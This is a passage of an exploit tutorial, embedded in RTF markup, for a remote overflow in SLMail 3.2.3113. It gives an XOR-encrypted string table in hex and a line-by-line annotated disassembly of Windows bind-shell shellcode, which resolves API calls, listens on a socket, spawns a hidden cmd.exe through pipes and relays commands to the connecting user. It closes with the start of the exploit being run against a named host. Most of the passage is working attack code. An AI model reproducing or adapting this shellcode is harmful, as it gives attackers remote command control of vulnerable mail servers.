\par \hich\af1\dbch\af28\loch\f1 000002F0  F8 FD DF F0 F5 FC 99 CA-F5 FC FC E9 99 DC E1 F0   ................
\par \hich\af1\dbch\af28\loch\f1 00000300  ED C9 EB F6 FA FC EA EA-99 CE CA D6 DA D2 AA AB   ................
\par \hich\af1\dbch\af28\loch\f1 00000310  99 EA F6 FA F2 FC ED 99-FB F0 F7 FD 99 F\hich\af1\dbch\af28\loch\f1 5 F0 EA   ................
\par \hich\af1\dbch\af28\loch\f1 00000320  ED FC F7 99 F8 FA FA FC-E9 ED 99 EA FC F7 FD 99   ................
\par \hich\af1\dbch\af28\loch\f1 00000330  EB FC FA EF 99 9B 99 82-A1 99 99 99 99 99 99 99   ................
\par \hich\af1\dbch\af28\loch\f1 00000340  99 99 99 99 99 FA F4 FD-B7 FC E1 FC 99 FF FF FF   ...............\hich\af1\dbch\af28\loch\f1 .
\par \hich\af1\dbch\af28\loch\f1 00000350  FF 0D 0A                                          ...
\par 
\par \hich\af1\dbch\af28\loch\f1 This will be tacked on to the very end of our shellcode.
\par 
\par \hich\af1\dbch\af28\loch\f1 Now it is time to get to the good stuff.
\par 
\par \hich\af1\dbch\af28\loch\f1 Note: this exploit assumes a base address of 0x00400000
\par 
\par \hich\af1\dbch\af28\loch\f1 The recommended way to follow t\hich\af1\dbch\af28\loch\f1 his is to step over the code in your\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 debugger while reading the explanations.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000138 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :0000013A 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000013B F7D0                    not eax
\par \hich\af1\dbch\af28\loch\f1 :0000013D 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :\hich\af1\dbch\af28\loch\f1 0000013E 59                      pop ecx
\par \hich\af1\dbch\af28\loch\f1 :0000013F F2                      repnz
\par \hich\af1\dbch\af28\loch\f1 :00000140 AF                      scasd
\par \hich\af1\dbch\af28\loch\f1 :00000141 59                      pop ecx
\par \hich\af1\dbch\af28\loch\f1 :00000142 B1C6                    mov cl, C6
\par \hich\af1\dbch\af28\loch\f1 :00000144 8BC7                    mov eax, edi
\par \hich\af1\dbch\af28\loch\f1 :00000146 48                      dec eax
\par \hich\af1\dbch\af28\loch\f1 :00000147 803099                  xor byte ptr [eax], 99
\par \hich\af1\dbch\af28\loch\f1 :0000014A E2FA                    loop 00000146
\par 
\par \hich\af1\dbch\af28\loch\f1 This sets edi to the end of our encrypted string table by scanning the buffer\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 for our dword (0xFFFFFFFF), e\hich\af1\dbch\af28\loch\f1 
cx holds the amount of characters to decrypt.\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 edi is then moved to eax, and each byte is decrypted (XORed with 0x99).  \hich\af1\dbch\af28\loch\f1 E\hich\af1\dbch\af28\loch\f1 ax
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 now points to the beginning of the string table.
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 :0000014C 33F6                    xor esi, esi
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :0000014E 96                      x\hich\af1\dbch\af28\loch\f1 chg eax,esi
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :0000014F BB99101144              mov ebx, 44111099
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :00000154 C1EB08                  shr ebx, 08
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :00000157 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :00000158 FF13                    call dword ptr [ebx]
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we make a call to LoadLibraryA, pushing e\hich\af1\dbch\af28\loch\f1 si as the parameter \loch\af1\dbch\af28\hich\f1 \endash \hich\af1\dbch\af28\loch\f1  which\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
points to "KERNEL32", the first string of the table.  The call is made by\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 giving ebx the location of LoadLibrary from SLMails import table, and we\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 tack on an extra byte to avoid the use of a null character.  We then kill\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 it by s\hich\af1\dbch\af28\loch\f1 hifting the value right one byte.  LoadLibraryA = 00441110h

\par 
\par \hich\af1\dbch\af28\loch\f1 :0000015A 8BD0                    mov edx, eax
\par \hich\af1\dbch\af28\loch\f1 :0000015C FC                      cld
\par \hich\af1\dbch\af28\loch\f1 :0000015D 33C9                    xor ecx, ecx
\par \hich\af1\dbch\af28\loch\f1 :0000015F B10B                    mov cl, 0B
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :00000161 49\hich\af1\dbch\af28\loch\f1                       dec ecx
\par \hich\af1\dbch\af28\loch\f1 :00000162 32C0                    xor al, al
\par \hich\af1\dbch\af28\loch\f1 :00000164 AC                      lodsb
\par \hich\af1\dbch\af28\loch\f1 :00000165 84C0                    test al, al
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :00000167 75F9                    jne 00000162
\par 
\par \hich\af1\dbch\af28\loch\f1 We give ecx the amount of procedures we have s\hich\af1\dbch\af28\loch\f1 pecified from the kernel, as\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
we will be creating a jump table for our functions.  Then we just increment\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 esi until we reach a null byte - moving to the next string name.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000169 52                      push edx
\par \hich\af1\dbch\af28\loch\f1 :0000016A 51                      push ec\hich\af1\dbch\af28\loch\f1 x
\par \hich\af1\dbch\af28\loch\f1 :0000016B 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :0000016C 52                      push edx
\par \hich\af1\dbch\af28\loch\f1 :0000016D B30C                    mov bl, 0C
\par \hich\af1\dbch\af28\loch\f1 :0000016F FF13                    call dword ptr [ebx]
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :00000171 AB                      stosd
\par \hich\af1\dbch\af28\loch\f1 :00000172 59                \hich\af1\dbch\af28\loch\f1       pop ecx
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :00000173 5A                      pop edx
\par \hich\af1\dbch\af28\loch\f1 :00000174 E2EC                    loop 00000162
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we call GetProcAddress, ebx already had the value from LoadLibrary, so we\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 only need to modify the low byte.  We then sto\hich\af1\dbch\af28\loch\f1 
re the address at edi, and loop\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 for the rest of the functions.  We now have a jump table at edi - we can now\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
call each function indirectly from edi.  e.g.: call dword ptr [edi-0c].
\par 
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :00000176 32C0                    xor al, al
\par \hich\af1\dbch\af28\loch\f1 :00000178 AC               \hich\af1\dbch\af28\loch\f1        lodsb
\par \hich\af1\dbch\af28\loch\f1 :00000179 84C0                    test al, al
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :0000017B 75F9                    jne 00000176
\par \hich\af1\dbch\af28\loch\f1 :0000017D B310                    mov bl, 10
\par \hich\af1\dbch\af28\loch\f1 :0000017F 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :00000180 FF13                    call dword ptr [ebx]
\par \hich\af1\dbch\af28\loch\f1 :000001\hich\af1\dbch\af28\loch\f1 82 8BD0                    mov edx, eax
\par \hich\af1\dbch\af28\loch\f1 :00000184 FC                      cld
\par \hich\af1\dbch\af28\loch\f1 :00000185 33C9                    xor ecx, ecx
\par \hich\af1\dbch\af28\loch\f1 :00000187 B106                    mov cl, 06
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :00000189 32C0                    xor al, al
\par \hich\af1\dbch\af28\loch\f1 :0000018B AC                      lodsb
\par \hich\af1\dbch\af28\loch\f1 :\hich\af1\dbch\af28\loch\f1 0000018C 84C0                    test al, al
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :0000018E 75F9                    jne 00000189
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :00000190 52                      push edx
\par \hich\af1\dbch\af28\loch\f1 :00000191 51                      push ecx
\par \hich\af1\dbch\af28\loch\f1 :00000192 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :00000193 52                      p\hich\af1\dbch\af28\loch\f1 ush edx
\par \hich\af1\dbch\af28\loch\f1 :00000194 B30C                    mov bl, 0C
\par \hich\af1\dbch\af28\loch\f1 :00000196 FF13                    call dword ptr [ebx]
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :00000198 AB                      stosd
\par \hich\af1\dbch\af28\loch\f1 :00000199 59                      pop ecx
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :0000019A 5A                      pop edx
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :0000019B E2EC                    loop 00000189
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 This is just a repeat of the earlier code, except now we are extending our\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
jump table to include the socket functions.
\par 
\par \hich\af1\dbch\af28\loch\f1 :0000019D 83C605                  add esi, 00000005
\par \hich\af1\dbch\af28\loch\f1 :000001A0 33C0                   \hich\af1\dbch\af28\loch\f1  xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :000001A2 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001A3 40                      inc eax
\par \hich\af1\dbch\af28\loch\f1 :000001A4 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001A5 40                      inc eax
\par \hich\af1\dbch\af28\loch\f1 :000001A6 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001A7 FF57E8             \hich\af1\dbch\af28\loch\f1      call [edi-18]
\par \hich\af1\dbch\af28\loch\f1 :000001AA 93                      xchg eax,ebx
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we push the values SOCK_STREAM, AF_INET, and null for the protocol.  We\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 then call the 'socket' function.
\par 
\par \hich\af1\dbch\af28\loch\f1 Note: We don't need to call WSAStartup as the target process has taken care o\hich\af1\dbch\af28\loch\f1 f\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 that for us
\par 
\par \hich\af1\dbch\af28\loch\f1 We also set esi to point to the socket structure, and we store the return\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 value from the socket procedure in ebx so it won't be destroyed by following
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 functions.
\par 
\par \hich\af1\dbch\af28\loch\f1 :000001AB 6A10                    push 00000010
\par \hich\af1\dbch\af28\loch\f1 :000001AD 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :000001AE 53                      push ebx
\par \hich\af1\dbch\af28\loch\f1 :000001AF FF57EC                  call [edi-14]
\par 
\par \hich\af1\dbch\af28\loch\f1 This just makes a call to bind, pushing our socket handle and the socket\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 structure as parameters.
\par 
\par \hich\af1\dbch\af28\loch\f1 :000001B2 6A02      \hich\af1\dbch\af28\loch\f1               push 00000002
\par \hich\af1\dbch\af28\loch\f1 :000001B4 53                      push ebx
\par \hich\af1\dbch\af28\loch\f1 :000001B5 FF57F0                  call [edi-10]
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we call listen, socket handle as the parameter.
\par 
\par \hich\af1\dbch\af28\loch\f1 :000001B8 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :000001BA 57                      \hich\af1\dbch\af28\loch\f1 push edi
\par \hich\af1\dbch\af28\loch\f1 :000001BB 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001BC B00C                    mov al, 0C
\par \hich\af1\dbch\af28\loch\f1 :000001BE AB                      stosd
\par \hich\af1\dbch\af28\loch\f1 :000001BF 58                      pop eax
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :000001C0 AB                      stosd
\par \hich\af1\dbch\af28\loch\f1 :000001\hich\af1\dbch\af28\loch\f1 C1 40                      inc eax
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :000001C2 AB                      stosd
\par \hich\af1\dbch\af28\loch\f1 :000001C3 5F                      pop edi
\par \hich\af1\dbch\af28\loch\f1 :000001C4 48                      dec eax
\par \hich\af1\dbch\af28\loch\f1 :000001C5 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001C6 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :0000\hich\af1\dbch\af28\loch\f1 01C7 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :000001C8 AD                      lodsd
\par \hich\af1\dbch\af28\loch\f1 :000001C9 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :000001CA FF57C0                  call [edi-40]
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we make our first call to CreatePipe, we create our SECURITY_ATTRIBUTES\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 structure\hich\af1\dbch\af28\loch\f1 
 at edi, and specify that the returned handles are inheritable.  \hich\af1\dbch\af28\loch\f1 E\hich\af1\dbch\af28\loch\f1 si\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 receives our read and write handles returned from the call.
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 :000001CD 48                      dec eax
\par \hich\af1\dbch\af28\loch\f1 :000001CE 50                      push eax
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :000001CF 57                      push e\hich\af1\dbch\af28\loch\f1 di
\par \hich\af1\dbch\af28\loch\f1 :000001D0 AD                      lodsd
\par \hich\af1\dbch\af28\loch\f1 :000001D1 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :000001D2 AD                      lodsd
\par \hich\af1\dbch\af28\loch\f1 :000001D3 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :000001D4 FF57C0                  call [edi-40]
\par 
\par \hich\af1\dbch\af28\loch\f1 Our second call to CreatePipe, again \hich\af1\dbch\af28\loch\f1 our read and write handles are stored at\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 esi.
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 :000001D7 48                      dec eax
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :000001D8 B044                    mov al, 44
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :000001DA 8907                    mov dword ptr [edi], eax
\par \hich\af1\dbch\af28\loch\f1 :000001DC 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :000001DD FF57C4                  call [edi-3C]
\par 
\par \hich\af1\dbch\af28\loch\f1 We make a call to GetStartupInfo, the structure will be stored at edi which we\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 give the size value.  The structure will need to be modified.
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 :000001E0 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :000001E2 8B46F4\hich\af1\dbch\af28\loch\f1                   mov eax, dword ptr [esi-0C]
\par \hich\af1\dbch\af28\loch\f1 :000001E5 89473C                  mov dword ptr [edi+3C], eax
\par \hich\af1\dbch\af28\loch\f1 :000001E8 894740                  mov dword ptr [edi+40], eax
\par \hich\af1\dbch\af28\loch\f1 :000001EB 8B06                    mov eax, dword ptr [esi]
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :000001ED 894738           \hich\af1\dbch\af28\loch\f1        mov dword ptr [edi+38], eax
\par \hich\af1\dbch\af28\loch\f1 :000001F0 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :000001F2 66B80101                mov ax, 0101
\par \hich\af1\dbch\af28\loch\f1 :000001F6 89472C                  mov dword ptr [edi+2C], eax
\par \hich\af1\dbch\af28\loch\f1 :000001F9 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :000001FA 57          \hich\af1\dbch\af28\loch\f1             push edi
\par \hich\af1\dbch\af28\loch\f1 :000001FB 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :000001FD 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001FE 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :000001FF 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000200 40                      inc eax
\par \hich\af1\dbch\af28\loch\f1 :00000201 50     \hich\af1\dbch\af28\loch\f1                  push eax
\par \hich\af1\dbch\af28\loch\f1 :00000202 48                      dec eax
\par \hich\af1\dbch\af28\loch\f1 :00000203 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000204 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000205 AD                      lodsd
\par \hich\af1\dbch\af28\loch\f1 :00000206 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :00000207 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :00000209 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000020A FF57C8                  call [edi-38]
\par 
\par \hich\af1\dbch\af28\loch\f1 By all means feel free to improve this code to drop some bytes, for example,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 using stosd to modify edi. At the time \hich\af1\dbch\af28\loch\f1 
I was just trying to make it _work_,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 and wasn't particularly worried about the size.  What the hell is going on\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 here anyway?
\par 
\par \hich\af1\dbch\af28\loch\f1 We are modifying the startupinfo structure before our call to CreateProcess.
\par 
\par \hich\af1\dbch\af28\loch\f1 We replace StdOutput and StdError with the handle of\hich\af1\dbch\af28\loch\f1  the write end of our\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
first created pipe.  We then replace StdInput with the read handle of our\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 second created pipe.  The flags value we set to\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES, and we set the ShowWindow value\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 to SW_HIDE.  esi points to "cmd.exe" \hich\af1\dbch\af28\loch\f1 and we make the call to CreateProcess.
\par 
\par \hich\af1\dbch\af28\loch\f1 :0000020D FF76F0                  push [esi-10]
\par \hich\af1\dbch\af28\loch\f1 :00000210 FF57CC                  call [edi-34]
\par \hich\af1\dbch\af28\loch\f1 :00000213 FF76FC                  push [esi-04]
\par \hich\af1\dbch\af28\loch\f1 :00000216 FF57CC                  call [edi-34]
\par 
\par \hich\af1\dbch\af28\loch\f1 CloseHandle is called\hich\af1\dbch\af28\loch\f1  to close the first read and the second write handles we\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 used for our StdHandles.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000219 48                      dec eax
\par \hich\af1\dbch\af28\loch\f1 :0000021A 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000021B 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000021C 53                      push ebx
\par \hich\af1\dbch\af28\loch\f1 :0000021D FF57F4                  call [edi-0C]
\par \hich\af1\dbch\af28\loch\f1 :00000220 8BD8                    mov ebx, eax
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we call accept and wait for a connection.  We store the returned handle in\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 ebx.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000222 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :00000224 B404            \hich\af1\dbch\af28\loch\f1         mov ah, 04
\par \hich\af1\dbch\af28\loch\f1 :00000226 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000227 C1E804                  shr eax, 04
\par \hich\af1\dbch\af28\loch\f1 :0000022A 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000022B FF57D4                  call [edi-2C]
\par \hich\af1\dbch\af28\loch\f1 :0000022E 8BF0                    mov esi, eax
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we \hich\af1\dbch\af28\loch\f1 create a 1024 byte buffer with GlobalAlloc, pushing\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 GMEM_FIXED+GMEM_ZEROINIT which will return a handle that we place in esi.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000230 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :00000232 8BC8                    mov ecx, eax
\par \hich\af1\dbch\af28\loch\f1 :00000234 B504                    mov ch, 04
\par \hich\af1\dbch\af28\loch\f1 :00000236 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000237 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000238 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :00000239 51                      push ecx
\par \hich\af1\dbch\af28\loch\f1 :0000023A 50                      push \hich\af1\dbch\af28\loch\f1 eax
\par \hich\af1\dbch\af28\loch\f1 :0000023B FF77A8                  push [edi-58]
\par \hich\af1\dbch\af28\loch\f1 :0000023E FF57D0                  call [edi-30]
\par \hich\af1\dbch\af28\loch\f1 :00000241 833F01                  cmp dword ptr [edi], 00000001
\par \hich\af1\dbch\af28\loch\f1 :00000244 7C22                    jl 00000268
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we start to get to the guts, this makes \hich\af1\dbch\af28\loch\f1 a call to PeekNamedPipe to see if\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
we have any data in the read end of the pipe (StdOutput/StdError), if not we\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 skip the following readfile/send functions as we are waiting on input from\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 the user.  edi stores the number of bytes read, [edi-58] is the handle\hich\af1\dbch\af28\loch\f1  to the\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 read end of the pipe.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000246 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :00000248 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000249 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :0000024A FF37                    push dword ptr [edi]
\par \hich\af1\dbch\af28\loch\f1 :0000024C 56                      pu\hich\af1\dbch\af28\loch\f1 sh esi
\par \hich\af1\dbch\af28\loch\f1 :0000024D FF77A8                  push [edi-58]
\par \hich\af1\dbch\af28\loch\f1 :00000250 FF57DC                  call [edi-24]
\par \hich\af1\dbch\af28\loch\f1 :00000253 0BC0                    or eax, eax
\par \hich\af1\dbch\af28\loch\f1 :00000255 742F                    je 00000286
\par 
\par \hich\af1\dbch\af28\loch\f1 We call ReadFile\hich\af1\dbch\af28\loch\f1  and fill our created buffer with the data from the read-end\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
of the pipe, we push the bytesread parameter from our earlier call to\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 PeekNamedPipe.  If the function fails, i.e.: the command prompt was exited\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 - then we jump to the end of our shellcode and cal\hich\af1\dbch\af28\loch\f1 l ExitProcess, which will\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 kill the slmail process.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000257 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :00000259 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000025A FF37                    push dword ptr [edi]
\par \hich\af1\dbch\af28\loch\f1 :0000025C 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :0000025D 53    \hich\af1\dbch\af28\loch\f1                   push ebx
\par \hich\af1\dbch\af28\loch\f1 :0000025E FF57F8                  call [edi-08]
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we call send to fire the data from our buffer off to the connected user.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000261 6A50                    push 00000050
\par \hich\af1\dbch\af28\loch\f1 :00000263 FF57E0                  call [edi-20]
\par \hich\af1\dbch\af28\loch\f1 :0000\hich\af1\dbch\af28\loch\f1 0266 EBC8                    jmp 00000230
\par 
\par \hich\af1\dbch\af28\loch\f1 Call Sleep and jump back to PeekNamedPipe.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000268 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :0000026A 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000026B B404                    mov ah, 04
\par \hich\af1\dbch\af28\loch\f1 :0000026D 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :0000026E 56                      push esi
\par \hich\af1\dbch\af28\loch\f1 :0000026F 53                      push ebx
\par \hich\af1\dbch\af28\loch\f1 :00000270 FF57FC                  call [edi-04]
\par 
\par \hich\af1\dbch\af28\loch\f1 This is the point we get to if there was no data in the read pipe, so we call\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 recv and receive input from the user.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000273 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :00000274 33C9                    xor ecx, ecx
\par \hich\af1\dbch\af28\loch\f1 :00000276 51                      push ecx
\par \hich\af1\dbch\af28\loch\f1 :00000277 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000278 56                      push \hich\af1\dbch\af28\loch\f1 esi
\par \hich\af1\dbch\af28\loch\f1 :00000279 FF77AC                  push [edi-54]
\par \hich\af1\dbch\af28\loch\f1 :0000027C FF57D8                  call [edi-28]
\par 
\par \hich\af1\dbch\af28\loch\f1 We push the handle of the write end of our pipe (StdInput), and we call\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 WriteFile sending the buffer from the user.  i.e.: we make it happen.
\par 
\par \hich\af1\dbch\af28\loch\f1 :0000027F \hich\af1\dbch\af28\loch\f1 6A50                    push 00000050
\par \hich\af1\dbch\af28\loch\f1 :00000281 FF57E0                  call [edi-20]
\par \hich\af1\dbch\af28\loch\f1 :00000284 EBAA                    jmp 00000230
\par 
\par \hich\af1\dbch\af28\loch\f1 Call Sleep again and jump back to PeekNamedPipe.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00000286 50                      push eax
\par \hich\af1\dbch\af28\loch\f1 :00000287 FF57E4                  call [edi-1C]
\par \hich\af1\dbch\af28\loch\f1 :0000028A 90                      nop
\par 
\par \hich\af1\dbch\af28\loch\f1 The shell has been exited so we call ExitProcess to clean up our mess.
\par 
\par \hich\af1\dbch\af28\loch\f1 And there we have it, full control is at our fingertips.
\par 
\par \hich\af1\dbch\af28\loch\f1 Before we enter the last section, on m\hich\af1\dbch\af28\loch\f1 odifying the executable of our\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 target, I'll give a quick example of the exploit in action.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Ownership.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 E:\\exploits>slxploit supermax.gen.nz 8376 1234
\par \hich\af1\dbch\af28\loch\f1 SLMail (3.2.3113) remote.
